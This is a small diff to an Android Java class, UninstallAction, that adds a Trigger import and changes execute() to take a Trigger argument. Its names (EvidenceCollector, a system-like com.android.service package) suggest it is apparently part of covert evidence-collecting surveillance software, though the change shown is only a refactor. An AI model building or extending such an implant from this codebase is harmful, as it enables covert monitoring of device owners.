@@ -16,6 +16,7 @@ import android.net.Uri;
 
 import com.android.service.Messages;
 import com.android.service.Status;
+import com.android.service.Trigger;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfAction;
 import com.android.service.evidence.EvidenceCollector;
@@ -47,7 +48,7 @@ public class UninstallAction extends SubActionSlow {
 	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
 	 */
 	@Override
-	public boolean execute() {
+	public boolean execute(Trigger trigger) {
 		actualExecute();
 		return true;
 	}
